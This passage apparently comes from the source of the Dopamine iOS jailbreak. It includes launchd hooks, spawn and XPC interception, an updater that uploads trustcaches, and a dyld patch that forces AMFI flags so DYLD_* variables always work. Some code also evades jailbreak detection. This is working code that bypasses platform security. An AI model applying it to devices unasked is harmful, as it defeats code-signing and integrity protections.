	else if (!strcmp(key, "jetsamMultiplier") && xpc_get_type(value) == XPC_TYPE_DOUBLE) {
		gSystemInfo.jailbreakSettings.jetsamMultiplier = xpc_double_get_value(value);
		return 0;
	}
	return -1;
}
```

`BaseBin/launchdhook/src/jbserver/jbsettings.h`:

```h
#include <xpc/xpc.h>

int jbsettings_get(const char *key, xpc_object_t *valueOut);
int jbsettings_set(const char *key, xpc_object_t value);

```

`BaseBin/launchdhook/src/jetsam_hook.c`:

```c
#include <sys/sysctl.h>
#include <string.h>
#include <unistd.h>
#include <kern_memorystatus.h>
#include <substrate.h>

// Allocated page tables (done by physrw handoff) count towards the physical memory footprint of the process that created them
// Unfortunately that means jetsam kills us if we do it too often
// For launchd, we therefore prevent it from enabling jetsam using this hook

int (*memorystatus_control_orig)(uint32_t command, int32_t pid, uint32_t flags, void *buffer, size_t buffersize);
int memorystatus_control_hook(uint32_t command, int32_t pid, uint32_t flags, void *buffer, size_t buffersize)
{
	if (command == MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT) {
		return 0;
	}
	return memorystatus_control_orig(command, pid, flags, buffer, buffersize);
}

void initJetsamHook(void)
{
	memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, 1, -1, NULL, 0);
	memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_HIGH_WATER_MARK, 1, -1, NULL, 0);
	MSHookFunction((void *)memorystatus_control, (void *)memorystatus_control_hook, (void **)&memorystatus_control_orig);
}
```

`BaseBin/launchdhook/src/jetsam_hook.h`:

```h
void initJetsamHook(void);
```

`BaseBin/launchdhook/src/main.m`:

```m
#import <Foundation/Foundation.h>
#import <libjailbreak/libjailbreak.h>
#import <libjailbreak/util.h>
#import <libjailbreak/kernel.h>
#import <libjailbreak/display.h>
#import <mach-o/dyld.h>
#import <os/alloc_once_private.h>
#import <dlfcn.h>
#import <spawn.h>
#import <pthread.h>
#import <sys/sysctl.h>
#import <substrate.h>

#import "spawn_hook.h"
#import "xpc_hook.h"
#import "daemon_hook.h"
#import "ipc_hook.h"
#import "jetsam_hook.h"
#import "crashreporter.h"
#import "boomerang.h"
#import "update.h"
#import "jbserver/jbserver_local.h"
#import "asl.h"

bool gInEarlyBoot = true;

void abort_with_reason(uint32_t reason_namespace, uint64_t reason_code, const char *reason_string, uint64_t reason_flags);
extern void systemwide_domain_set_enabled(bool enabled);

// Boot logo drawing invokes some IOKit stuff that seems to initialize os_log / asl
// We need to temporarily set asl_enabled to false so that it will skip that initialization
// If we don't do this and it does the initialization, we will cause an assert in _os_log_simple_reinit_4launchd later
void exec_with_asl_disabled(void (^block)(void))
{
	struct asl_context *aslCtx = os_alloc_once(OS_ALLOC_ONCE_KEY_LIBSYSTEM_PLATFORM_ASL, sizeof(struct asl_context), NULL);
	aslCtx->asl_enabled = false;
	block();
	aslCtx->asl_enabled = true;
}

void draw_boot_logo(const char *bootLogoPath)
{
	if (bootLogoPath) {
		if (!access(bootLogoPath, R_OK)) {
			// When launchd tears down the userspace, it will do so in no particular order
			// If SpringBoard gets unloaded before backboardd, backboardd will draw a spinning wheel to the framebuffer
			// If this happens after we wrote the boot logo to the framebuffer, it will be replaced by that
			// Therefore, we kill backboardd early so that this race does not happen
			killall("/usr/libexec/backboardd", SIGTERM);
			exec_with_asl_disabled(^{
				display_draw_image_path(bootLogoPath);
			});
		}
	}
}

int (*sysctlbyname_orig)(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen) = NULL;
int sysctlbyname_hook(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen)
{
	int r = sysctlbyname_orig(name, oldp, oldlenp, newp, newlen);
	if (!strcmp(name, "kern.willuserspacereboot")) {
		draw_boot_logo(JBROOT_PATH("/basebin/bootlogo.jp2"));
	}
	return r;
}

__attribute__((constructor)) static void initializer(void)
{
	crashreporter_start();

	// Retrieve jbroot path early based on our dylib path (<JBROOT>/basebin/launchd) so we can use JBROOT_PATH before boomerang_recoverPrimitives
	@autoreleasepool {
		Dl_info selfInfo;
		if (dladdr(&initializer, &selfInfo) != 0) {
			NSString *selfPath = [NSString stringWithUTF8String:selfInfo.dli_fname];
			gSystemInfo.jailbreakInfo.rootPath = strdup(selfPath.stringByDeletingLastPathComponent.stringByDeletingLastPathComponent.fileSystemRepresentation);
		}
	}

	// If we performed a jbupdate before the userspace reboot, these vars will be set
	// In that case, we want to run finalizers
	const char *jbupdatePrevVersion = getenv("JBUPDATE_PREV_VERSION");
	const char *jbupdateNewVersion = getenv("JBUPDATE_NEW_VERSION");
	if (jbupdatePrevVersion && jbupdateNewVersion) {
		jbupdate_finalize_stage1(jbupdatePrevVersion, jbupdateNewVersion);
	}

	bool firstLoad = false;
	if (getenv("DOPAMINE_INITIALIZED") != 0) {
		// If Dopamine was initialized before, we assume we're coming from a userspace reboot

		// Stock bug: These prefs wipe themselves after a reboot (they contain a boot time and this is matched when they're loaded)
		// But on userspace reboots, they apparently do not get wiped as the boot time doesn't change
		// We could try to change the boot time ourselves, but I'm worried of potential side effects
		// So we just wipe the offending preferences ourselves
		// In practice this fixes nano launch daemons not being loaded after the userspace reboot, resulting in certain apple watch features breaking
		if (!access("/var/mobile/Library/Preferences/com.apple.NanoRegistry.NRRootCommander.volatile.plist", W_OK)) {
			remove("/var/mobile/Library/Preferences/com.apple.NanoRegistry.NRRootCommander.volatile.plist");
		}
		if (!access("/var/mobile/Library/Preferences/com.apple.NanoRegistry.NRLaunchNotificationController.volatile.plist", W_OK)) {
			remove("/var/mobile/Library/Preferences/com.apple.NanoRegistry.NRLaunchNotificationController.volatile.plist");
		}

		draw_boot_logo(JBROOT_PATH("/basebin/bootlogo.jp2"));
	}
	else {
		// Here we should have been injected into a live launchd on the fly
		// In this case, we are not in early boot...
		gInEarlyBoot = false;
		firstLoad = true;
	}

	int err = boomerang_recoverPrimitives(firstLoad, true);
	if (err != 0) {
		char msg[1000];
		snprintf(msg, 1000, "Dopamine: Failed to recover primitives (error %d), cannot continue.", err);
		abort_with_reason(7, 1, msg, 0);
		return;
	}

	if (jbupdatePrevVersion && jbupdateNewVersion) {
		jbupdate_finalize_stage2(jbupdatePrevVersion, jbupdateNewVersion);
		unsetenv("JBUPDATE_PREV_VERSION");
		unsetenv("JBUPDATE_NEW_VERSION");
	}

	cs_allow_invalid(proc_self(), false);

	initXPCHooks();
	initDaemonHooks();
	initSpawnHooks();
	initIPCHooks();
	initJetsamHook();
	MSHookFunction((void *)sysctlbyname, (void *)sysctlbyname_hook, (void **)&sysctlbyname_orig);

	if (getenv("DOPAMINE_IS_HIDDEN") != 0) {
		// If the jailbreak is currently hidden, fakelib had to be mounted again before the userspace reboot
		// Now that the userspace reboot is over, we can unmount it again

		// Just like when we mount it inside the posix_spawn hook, the jbserver is not up at this point in time
		// So we need to host our own here again, just so that jbctl can talk to it
		mach_port_t serverPort = jbserver_local_start();
		jbctl_earlyboot(serverPort, "internal", "fakelib", "unmount", NULL);
		jbserver_local_stop();

		// Also disable the systemwide domain again
		systemwide_domain_set_enabled(false);

		// No need to keep this around
		unsetenv("DOPAMINE_IS_HIDDEN");
	}

	// This will ensure launchdhook is always reinjected after userspace reboots
	// As this launchd will pass environ to the next launchd...
	setenv("DYLD_INSERT_LIBRARIES", JBROOT_PATH("/basebin/launchdhook.dylib"), 1);

	// Mark Dopamine as having been initialized before
	setenv("DOPAMINE_INITIALIZED", "1", 1);

	// Set an identifier that uniquely identifies this userspace boot
	// Part of rootless v2 spec
	setenv("LAUNCHD_UUID", [NSUUID UUID].UUIDString.UTF8String, 1);
}
```

`BaseBin/launchdhook/src/spawn_hook.c`:

```c
#include <spawn.h>
#include "../systemhook/src/common.h"
#include "boomerang.h"
#include "crashreporter.h"
#include "update.h"
#include <libjailbreak/util.h>
#include <substrate.h>
#include <mach-o/dyld.h>
#include <sys/param.h>
#include <sys/mount.h>
#include "jbserver/jbserver_local.h"
extern char **environ;

void abort_with_reason(uint32_t reason_namespace, uint64_t reason_code, const char *reason_string, uint64_t reason_flags);

extern int systemwide_trust_file_by_path(const char *path);
extern int platform_set_process_debugged(uint64_t pid, bool fullyDebugged);
extern void systemwide_domain_set_enabled(bool enabled);

#define LOG_PROCESS_LAUNCHES 0

extern bool gInEarlyBoot;

void early_boot_done(void)
{
	gInEarlyBoot = false;
}

void ensure_fakelib_mounted(void)
{
	struct statfs fsb;
    if (statfs("/usr/lib", &fsb) != 0) return;
    if (strcmp(fsb.f_mntonname, "/usr/lib") != 0) {
		systemwide_domain_set_enabled(true);

		// The jailbreak server is not reachable at this point in the launchd lifecycle
		// So we need to host our own, just so that jbctl can talk to it
		mach_port_t serverPort = jbserver_local_start();
		jbctl_earlyboot(serverPort, "internal", "fakelib", "mount", NULL);
		jbserver_local_stop();

		// Note down that the jailbreak was hidden
		// So that after the userspace reboot, we can unmount fakelib again
		setenv("DOPAMINE_IS_HIDDEN", "1", true);
	}
}

int __posix_spawn_orig_wrapper(pid_t *restrict pid, const char *restrict path,
					   struct _posix_spawn_args_desc *desc,
					   char *const argv[restrict],
					   char *const envp[restrict])
{
	// we need to disable the crash reporter during the orig call
	// otherwise the child process inherits the exception ports
	// and this would trip jailbreak detections
	crashreporter_pause();	
	int r = __posix_spawn_orig(pid, path, desc, argv, envp);
	crashreporter_resume();

	return r;
}

int __posix_spawn_hook(pid_t *restrict pid, const char *restrict path,
					   struct _posix_spawn_args_desc *desc,
					   char *const argv[restrict],
					   char *const envp[restrict])
{
	if (path) {
		char executablePath[1024];
		uint32_t bufsize = sizeof(executablePath);
		_NSGetExecutablePath(&executablePath[0], &bufsize);
		if (!strcmp(path, executablePath)) {
			// This spawn will perform a userspace reboot...
			// Instead of the ordinary hook, we want to reinsert this dylib
			// This has already been done in envp so we only need to call the original posix_spawn

			// We are back in "early boot" for the remainder of this launchd instance
			// Mainly so we don't lock up while spawning boomerang
			gInEarlyBoot = true;

			// If the jailbreak is currently hidden, fakelib is not mounted
			// It needs to be mounted to regain launchd code execution after the userspace reboot
			ensure_fakelib_mounted();

#if LOG_PROCESS_LAUNCHES
			FILE *f = fopen("/var/mobile/launch_log.txt", "a");
			fprintf(f, "==== USERSPACE REBOOT ====\n");
			fclose(f);
#endif

			// Before the userspace reboot, we want to stash the primitives into boomerang
			boomerang_stashPrimitives();

			// Fix Xcode debugging being broken after the userspace reboot
			unmount("/Developer", MNT_FORCE);

			// If there is a pending jailbreak update, apply it now
			const char *stagedJailbreakUpdate = getenv("STAGED_JAILBREAK_UPDATE");
			if (stagedJailbreakUpdate) {
				int r = jbupdate_basebin(stagedJailbreakUpdate);
				if (r != 0) {
					char msg[1000];
					snprintf(msg, 1000, "Failed updating basebin (error %d).", r);
					abort_with_reason(7, 1, msg, 0);
				}
				unsetenv("STAGED_JAILBREAK_UPDATE");
			}

			// Always use environ instead of envp, as boomerang_stashPrimitives calls setenv
			// setenv / unsetenv can sometimes cause environ to get reallocated
			// In that case envp may point to garbage or be empty
			// Say goodbye to this process
			return __posix_spawn_orig_wrapper(pid, path, desc, argv, environ);
		}
	}

#if LOG_PROCESS_LAUNCHES
	if (path) {
		FILE *f = fopen("/var/mobile/launch_log.txt", "a");
		fprintf(f, "%s", path);
		int ai = 0;
		while (argv) {
			if (argv[ai]) {
				if (ai >= 1) {
					fprintf(f, " %s", argv[ai]);
				}
				ai++;
			}
			else {
				break;
			}
		}
		fprintf(f, "\n");
		fclose(f);

		// if (!strcmp(path, "/usr/libexec/xpcproxy")) {
		// 	const char *tmpBlacklist[] = {
		// 		"com.apple.logd"
		// 	};
		// 	size_t blacklistCount = sizeof(tmpBlacklist) / sizeof(tmpBlacklist[0]);
		// 	for (size_t i = 0; i < blacklistCount; i++)
		// 	{
		// 		if (!strcmp(tmpBlacklist[i], firstArg)) {
		// 			FILE *f = fopen("/var/mobile/launch_log.txt", "a");
		// 			fprintf(f, "blocked injection %s\n", firstArg);
		// 			fclose(f);
		// 			return __posix_spawn_orig_wrapper(pid, path, file_actions, desc, envp);
		// 		}
		// 	}
		// }
	}
#endif

	// We can't support injection into processes that get spawned before the launchd XPC server is up
	// (Technically we could but there is little reason to, since it requires additional work)
	if (gInEarlyBoot) {
		if (!strcmp(path, "/usr/libexec/xpcproxy")) {
			// The spawned process being xpcproxy indicates that the launchd XPC server is up
			// All processes spawned including this one should be injected into
			early_boot_done();
		}
		else {
			return __posix_spawn_orig_wrapper(pid, path, desc, argv, envp);
		}
	}

	return posix_spawn_hook_shared(pid, path, desc, argv, envp, __posix_spawn_orig_wrapper, systemwide_trust_file_by_path, platform_set_process_debugged, jbsetting(jetsamMultiplier));
}

void initSpawnHooks(void)
{
	MSHookFunction(&__posix_spawn, (void *)__posix_spawn_hook, NULL);
}
```

`BaseBin/launchdhook/src/spawn_hook.h`:

```h
void initSpawnHooks(void);
```

`BaseBin/launchdhook/src/update.h`:

```h
#ifndef UPDATE_H
#define UPDATE_H

int jbupdate_basebin(const char *basebinTarPath);
void jbupdate_finalize_stage1(const char *prevVersion, const char *newVersion);
void jbupdate_finalize_stage2(const char *prevVersion, const char *newVersion);

#endif
```

`BaseBin/launchdhook/src/update.m`:

```m
#include <stdlib.h>
#include <libjailbreak/util.h>
#include <libjailbreak/trustcache.h>
#include <libjailbreak/kcall_arm64.h>
#include <libjailbreak/signatures.h>
#include <libjailbreak/basebin_gen.h>
#include <xpc/xpc.h>
#include <dlfcn.h>

#import <Foundation/Foundation.h>

void abort_with_reason(uint32_t reason_namespace, uint64_t reason_code, const char *reason_string, uint64_t reason_flags);

int jbupdate_basebin(const char *basebinTarPath)
{
	@autoreleasepool {
		int r = 0;
		if (access(basebinTarPath, F_OK) != 0) return 1;

		NSString *prevVersion = [NSString stringWithContentsOfFile:JBROOT_PATH(@"/basebin/.version") encoding:NSUTF8StringEncoding error:nil] ?: @"2.0";

		// Extract basebin tar
		NSString *tmpExtractionPath = [NSTemporaryDirectory() stringByAppendingPathComponent:[NSUUID UUID].UUIDString];
		r = libarchive_unarchive(basebinTarPath, tmpExtractionPath.fileSystemRepresentation);
		if (r != 0) {
			[[NSFileManager defaultManager] removeItemAtPath:tmpExtractionPath error:nil];
			return 2;
		}
		NSString *tmpBasebinPath = [tmpExtractionPath stringByAppendingPathComponent:@"basebin"];

		// Update basebin trustcache
		NSString *trustcachePath = [tmpBasebinPath stringByAppendingPathComponent:@"basebin.tc"];
		if (![[NSFileManager defaultManager] fileExistsAtPath:trustcachePath]) return 3;
		trustcache_file_v1 *basebinTcFile = NULL;
		if (trustcache_file_build_from_path(trustcachePath.fileSystemRepresentation, &basebinTcFile) != 0) {
			[[NSFileManager defaultManager] removeItemAtPath:tmpExtractionPath error:nil];
			return 4;
		}
		r = trustcache_file_upload_with_uuid(basebinTcFile, BASEBIN_TRUSTCACHE_UUID);
		free(basebinTcFile);
		if (r != 0) {
			[[NSFileManager defaultManager] removeItemAtPath:tmpExtractionPath error:nil];
			return 5;
		}
		else {
			[[NSFileManager defaultManager] removeItemAtPath:trustcachePath error:nil];
		}

		// Replace basebin content
		NSArray *newBasebinContents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:tmpBasebinPath error:nil];
		for (NSString *basebinItem in newBasebinContents) {
			NSString *newBasebinPath = [tmpBasebinPath stringByAppendingPathComponent:basebinItem];
			NSString *oldBasebinPath = [JBROOT_PATH(@"/basebin") stringByAppendingPathComponent:basebinItem];
			if ([[NSFileManager defaultManager] fileExistsAtPath:oldBasebinPath]) {
				[[NSFileManager defaultManager] removeItemAtPath:oldBasebinPath error:nil];
			}
			[[NSFileManager defaultManager] copyItemAtPath:newBasebinPath toPath:oldBasebinPath error:nil];
		}
		[[NSFileManager defaultManager] removeItemAtPath:tmpExtractionPath error:nil];

		// Patch basebin plists
		NSURL *basebinDaemonsURL = [NSURL fileURLWithPath:JBROOT_PATH(@"/basebin/LaunchDaemons")];
		for (NSURL *basebinDaemonURL in [[NSFileManager defaultManager] contentsOfDirectoryAtURL:basebinDaemonsURL includingPropertiesForKeys:nil options:0 error:nil]) {
			NSString *plistPath = basebinDaemonURL.path;
			NSMutableDictionary *plistDict = [NSMutableDictionary dictionaryWithContentsOfFile:plistPath];
			if (plistDict) {
				bool madeChanges = NO;
				NSMutableArray *programArguments = ((NSArray *)plistDict[@"ProgramArguments"]).mutableCopy;
				for (NSString *argument in [programArguments reverseObjectEnumerator]) {
					if ([argument containsString:@"@JBROOT@"]) {
						programArguments[[programArguments indexOfObject:argument]] = [argument stringByReplacingOccurrencesOfString:@"@JBROOT@" withString:JBROOT_PATH(@"/")];
						madeChanges = YES;
					}
				}
				if (madeChanges) {
					plistDict[@"ProgramArguments"] = programArguments.copy;
					[plistDict writeToFile:plistPath atomically:NO];
				}
			}
		}

		NSString *newVersion = [NSString stringWithContentsOfFile:JBROOT_PATH(@"/basebin/.version") encoding:NSUTF8StringEncoding error:nil];
		if (!newVersion) return 6;

		setenv("JBUPDATE_PREV_VERSION", prevVersion.UTF8String, 1);
		setenv("JBUPDATE_NEW_VERSION", newVersion.UTF8String, 1);
		return 0;
	}
}

void jbupdate_update_system_info(void)
{
	@autoreleasepool {
		// Load XPF
		void *xpfHandle = dlopen("@loader_path/libxpf.dylib", RTLD_NOW);
		if (!xpfHandle) {
			char msg[4000];
			snprintf(msg, 4000, "Dopamine: dlopening libxpf failed: (%s), cannot continue.", dlerror());
			abort_with_reason(7, 1, msg, 0);
			return;
		}
		int (*xpf_start_with_kernel_path)(const char *kernelPath) = dlsym(xpfHandle, "xpf_start_with_kernel_path");
		const char *(*xpf_get_error)(void) = dlsym(xpfHandle, "xpf_get_error");
		bool (*xpf_set_is_supported)(const char *name) = dlsym(xpfHandle, "xpf_set_is_supported");
		void (*xpf_stop)(void) = dlsym(xpfHandle, "xpf_stop");
		xpc_object_t (*xpf_construct_offset_dictionary)(const char *sets[]) = dlsym(xpfHandle, "xpf_construct_offset_dictionary");

		const char *kernelPath = prebootUUIDPath("/System/Library/Caches/com.apple.kernelcaches/kernelcache");
		xpc_object_t newSystemInfoXdict = NULL;

		// Rerun patchfinder
		int r = xpf_start_with_kernel_path(kernelPath);
		const char *error = NULL;
		if (r == 0) {
			char *sets[] = {
				"translation",
				"trustcache",
				"sandbox",
				"physmap",
				"struct",
				"physrw",
				"perfkrw",
				NULL,
				NULL,
				NULL,
				NULL,	
			};

			uint32_t idx = 7;
			if (xpf_set_is_supported("devmode")) {
				sets[idx++] = "devmode"; 
			}
			if (xpf_set_is_supported("badRecovery")) {
				sets[idx++] = "badRecovery"; 
			}
			if (xpf_set_is_supported("arm64kcall")) {
				sets[idx++] = "arm64kcall"; 
			}

			newSystemInfoXdict = xpf_construct_offset_dictionary((const char **)sets);
			if (!newSystemInfoXdict) {
				error = xpf_get_error();
			}
			xpf_stop();
		}
		else {
			xpf_stop();
			error = xpf_get_error();
		}

		if (error) {
			char msg[4000];
			snprintf(msg, 4000, "Dopamine: Updating system info via XPF failed with error: (%s), cannot continue.", error);
			abort_with_reason(7, 1, msg, 0);
			return;
		}

		dlclose(xpfHandle);

		// Get old info and merge new info into it
		xpc_object_t systemInfoXdict = jbinfo_get_serialized();
		xpc_dictionary_apply(newSystemInfoXdict, ^_Bool(const char *key, xpc_object_t xobj) {
			xpc_dictionary_set_value(systemInfoXdict, key, xobj);
			return true;
		});

		// Rebuild gSystemInfo
		jbinfo_initialize_dynamic_offsets(systemInfoXdict);
		jbinfo_initialize_hardcoded_offsets();
	}
}

// Before primitives are retrieved
void jbupdate_finalize_stage1(const char *prevVersion, const char *newVersion)
{
	// Currently unused, reserved for the future
}

// After primitives are retrieved
void jbupdate_finalize_stage2(const char *prevVersion, const char *newVersion)
{
	jbupdate_update_system_info();

	if (strcmp(prevVersion, "2.4") < 0 && strcmp(newVersion, "2.4") >= 0) {
		// On Dopamine <= 2.3, dyld used to be a file on the fakelib mount
		// Due to that, the fakelib mount cannot be unmounted, or else the system will panic
		// Additionally it cannot be modified because bind mounts are weird and won't update correctly
		// In >= 2.4 dyld is a symlink to elsewhere, which allows it to be updated and the bind mount to be unmounted
		// But if we're coming from <= 2.3, we have no option other than to reboot the device
		reboot(0);
	}

	// Legacy, this file is no longer used
	if (!access(JBROOT_PATH("/basebin/.idownloadd_enabled"), F_OK)) {
		remove(JBROOT_PATH("/basebin/.idownloadd_enabled"));
	}

	if (strcmp(prevVersion, "2.1") < 0 && strcmp(newVersion, "2.1") >= 0) {
		// Default value for this pref is true
		// Set it during jbupdate if prev version is <2.1 and new version is >=2.1
		gSystemInfo.jailbreakSettings.markAppsAsDebugged = true;

#ifndef __arm64e__
		// Initialize kcall only after we have the offsets required for it
		arm64_kcall_init();
#endif
	}

	// Update patched dyld
	int r = basebin_generate(YES);
	if (r != 0) {
		char msg[4000];
		snprintf(msg, 4000, "Dopamine: Updating patched dyld failed with error %d, cannot continue.", r);
		abort_with_reason(7, 1, msg, 0);
	}

	// Update dyld trustcache
	cdhash_t *cdhashes = NULL;
	uint32_t cdhashesCount = 0;
	file_collect_untrusted_cdhashes_by_path(JBROOT_PATH("/basebin/.fakelib/dyld"), &cdhashes, &cdhashesCount);

	if (cdhashesCount > 1) {
		char msg[4000];
		snprintf(msg, 4000, "Dopamine: Updating patched dyld failed due to unexpected amount of cdhashes (%d), cannot continue.", cdhashesCount);
		abort_with_reason(7, 1, msg, 0);
	}
	else if (cdhashesCount == 1) {
		trustcache_file_v1 *dyldTCFile = NULL;
		r = trustcache_file_build_from_cdhashes(cdhashes, cdhashesCount, &dyldTCFile);
		free(cdhashes);
		if (r != 0) {
			char msg[4000];
			snprintf(msg, 4000, "Dopamine: Building dyld trustcache failed with error %d, cannot continue.", r);
			abort_with_reason(7, 1, msg, 0);
		}

		r = trustcache_file_upload_with_uuid(dyldTCFile, DYLD_TRUSTCACHE_UUID);
		if (r != 0) {
			char msg[4000];
			snprintf(msg, 4000, "Dopamine: Updating dyld trustcache failed with error %d, cannot continue.", r);
			abort_with_reason(7, 1, msg, 0);
		}

		free(dyldTCFile);
	}

	JBFixMobilePermissions();
}
```

`BaseBin/launchdhook/src/xpc_hook.c`:

```c
#include <libjailbreak/libjailbreak.h>
#include <mach-o/dyld.h>
#include <xpc/xpc.h>
#include <bsm/libbsm.h>
#include <libproc.h>
#include <sandbox.h>
#include <substrate.h>
#include <libjailbreak/jbserver.h>

mach_msg_header_t* dispatch_mach_msg_get_msg(void *message, size_t *_Nullable size_ptr);
int jbserver_received_mach_message(audit_token_t *auditToken, struct jbserver_mach_msg *jbsMachMsg);
int jbserver_received_complex_mach_message(audit_token_t *auditToken, uint64_t action, struct jbserver_mach_complex_msg *jbsMachMsg);

int xpc_receive_mach_msg(void *msg, void *a2, void *a3, void *a4, xpc_object_t *xOut);
int (*xpc_receive_mach_msg_orig)(void *msg, void *a2, void *a3, void *a4, xpc_object_t *xOut);
int xpc_receive_mach_msg_hook(void *msg, void *a2, void *a3, void *a4, xpc_object_t *xOut)
{
	size_t msgBufSize = 0;
    struct jbserver_mach_msg *jbsMachMsg = (struct jbserver_mach_msg *)dispatch_mach_msg_get_msg(msg, &msgBufSize);
	bool wasProcessed = false;
    if (jbsMachMsg != NULL && msgBufSize >= sizeof(mach_msg_header_t)) {
        size_t msgSize = jbsMachMsg->hdr.msgh_size;
        if (msgSize <= msgBufSize && msgSize >= sizeof(struct jbserver_mach_msg) && jbsMachMsg->magic == JBSERVER_MACH_MAGIC) {
			mach_msg_context_trailer_t *trailer = (mach_msg_context_trailer_t *)((uint8_t *)jbsMachMsg + round_msg(jbsMachMsg->hdr.msgh_size));
            jbserver_received_mach_message(&trailer->msgh_audit, jbsMachMsg);
			wasProcessed = true;
            // Pass the message to xpc_receive_mach_msg anyway, it will get rid of it for us
        }
    }
	// Not needed, since we don't have any complex messages at the moment
	/*struct jbserver_mach_complex_msg *jbsComplexMachMsg = (struct jbserver_mach_complex_msg *)jbsMachMsg;
	if (!wasProcessed && jbsComplexMachMsg != NULL && msgBufSize >= sizeof(struct jbserver_mach_complex_msg)) {
		// Warning: Witchcraft incoming
		size_t msgSize = jbsComplexMachMsg->hdr.msgh_size;
		if (jbsComplexMachMsg->hdr.msgh_bits & MACH_MSGH_BITS_COMPLEX) {
			uintptr_t magicOff = sizeof(struct jbserver_mach_complex_msg) + (jbsComplexMachMsg->body.msgh_descriptor_count * sizeof(mach_msg_port_descriptor_t));
			uintptr_t actionOff = magicOff + sizeof(uint64_t);
			if (msgSize >= (actionOff + sizeof(uint64_t))) {
				uint64_t magic = *(uint64_t *)(((uintptr_t)jbsComplexMachMsg) + magicOff);
				if (magic == JBSERVER_MACH_MAGIC) {
					uint64_t action = *(uint64_t *)(((uintptr_t)jbsComplexMachMsg) + actionOff);
					mach_msg_context_trailer_t *trailer = (mach_msg_context_trailer_t *)((uint8_t *)jbsComplexMachMsg + round_msg(jbsComplexMachMsg->hdr.msgh_size));
					jbserver_received_complex_mach_message(&trailer->msgh_audit, action, jbsComplexMachMsg);
					wasProcessed = true;
            		// Pass the message to xpc_receive_mach_msg anyway, it will get rid of it for us
				}
			}
		}
	}*/

	int r = xpc_receive_mach_msg_orig(msg, a2, a3, a4, xOut);
	if (!wasProcessed && r == 0 && xOut && *xOut) {
		if (jbserver_received_xpc_message(&gGlobalServer, *xOut) == 0) {
			// Returning non null here makes launchd disregard this message
			// For jailbreak messages we have the logic to handle them
			xpc_release(*xOut);
			return 22;
		}
	}
	return r;
}

void initXPCHooks(void)
{
	MSHookFunction(xpc_receive_mach_msg, (void *)xpc_receive_mach_msg_hook, (void **)&xpc_receive_mach_msg_orig);
}

```

`BaseBin/launchdhook/src/xpc_hook.h`:

```h
void initXPCHooks(void);
```

`BaseBin/libjailbreak/Makefile`:

```
TARGET = libjailbreak.dylib

CC = clang

CFLAGS = -framework Foundation -framework CoreServices -framework Security -framework IOKit -framework IOSurface -framework IOMobileFramebuffer -framework CoreGraphics -framework ImageIO -lMobileGestalt -I../.include -I../_external/modules/litehook/src -isysroot $(shell xcrun --sdk iphoneos --show-sdk-path) -arch arm64 -arch arm64e -miphoneos-version-min=15.0 -fobjc-arc -dynamiclib -install_name @loader_path/$(TARGET) -I$(shell brew --prefix)/opt/libarchive/include -g -O2
LDFLAGS = -larchive -lbsm -L../.build -F ../_external/frameworks -lchoma

sign: $(TARGET)
	@ldid -S $<

$(TARGET): $(wildcard src/*.c src/*.m src/*.S ../_external/modules/litehook/src/*.c)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $^

clean:
	@rm -f $(TARGET)

```

`BaseBin/libjailbreak/src/basebin_gen.h`:

```h
#ifndef __BASEBIN_GEN_H
#define __BASEBIN_GEN_H

#include <stdbool.h>

int basebin_generate(bool comingFromJBUpdate);

#endif
```

`BaseBin/libjailbreak/src/basebin_gen.m`:

```m
#import "libjailbreak.h"
#import "carboncopy.h"
#import "codesign.h"
#import <Foundation/Foundation.h>
#import <sys/sysctl.h>

int apply_dyld_patch(NSString *dyldPath, const char *newUUIDPrefix)
{
	MachO *dyldMacho = macho_init_for_writing(dyldPath.fileSystemRepresentation);
	if (!dyldMacho) return -1;

	__block int r = 0;

	// Make AMFI flags always be `0xff`, allows DYLD_* variables to always work
	__block uint64_t getAMFIAddr = 0;
	macho_enumerate_symbols(dyldMacho, ^(const char *name, uint8_t type, uint64_t vmaddr, bool *stop){
		if (!strcmp(name, "__ZN5dyld413ProcessConfig8Security7getAMFIERKNS0_7ProcessERNS_15SyscallDelegateE")) {
			getAMFIAddr = vmaddr;
		}
	});
	uint32_t getAMFIPatch[] = {
		0xd2801fe0, // mov x0, 0xff
		0xd65f03c0  // ret
	};

	if (getAMFIAddr == 0) {
        printf("Error: Failed patchfinding getAMFI\n");
        return -1;
    }

	macho_write_at_vmaddr(dyldMacho, getAMFIAddr, sizeof(getAMFIPatch), getAMFIPatch);

	// iOS 16+: Change LC_UUID to prevent the kernel from using the in-cache dyld
	macho_enumerate_load_commands(dyldMacho, ^(struct load_command loadCommand, uint64_t offset, void *cmd, bool *stop) {
		if (loadCommand.cmd == LC_UUID) {
            // The new UUID will look like this:
            // DOPA<dopamine version>\0<rest of original UUID>
            // This way we ensure:
            // - The version it was patched on and it being patched by Dopamine is identifiable later
            // - The UUID is still unique based on the source dyld that was patched

            size_t newUUIDPrefixLen = strlen(newUUIDPrefix) + 1;
            if (newUUIDPrefixLen <= sizeof(uuid_t)) {
                // Also write null byte here, because otherwise it's impossible to know where the version string ends
                macho_write_at_offset(dyldMacho, offset + offsetof(struct uuid_command, uuid), newUUIDPrefixLen, newUUIDPrefix);
            }
            else {
				r = -1;
                printf("Error: Failed to write identifier to LC_UUID, too long (%zu)\n", newUUIDPrefixLen);
            }
			*stop = true;
		}
	});

	macho_free(dyldMacho);
	return r;
}

NSString *dyldhook_dylib_for_platform(void)
{
	cpu_subtype_t cpusubtype = 0;
	size_t len = sizeof(cpusubtype);
	if (sysctlbyname("hw.cpusubtype", &cpusubtype, &len, NULL, 0) == -1) { return nil; }
	if ((cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E) {
		if (@available(iOS 16.0, *)) {
			return @"dyldhook_merge.arm64e.dylib"; 
		}
		else {
			return @"dyldhook_merge.arm64e.iOS15.dylib"; 
		}
	}
	else {
		if (@available(iOS 16.0, *)) {
			return @"dyldhook_merge.arm64.dylib"; 
		}
		else {
			return @"dyldhook_merge.arm64.iOS15.dylib"; 
		}
	}
}

int merge_dyldhook(NSString *originalDyldPath, NSString *outPath)
{
	NSString *dyldhookMergeDylibName = dyldhook_dylib_for_platform();
	if (!dyldhookMergeDylibName) {
		printf("Error: Failed to locate dyldhook.dylib\n");
		return -1;
	}

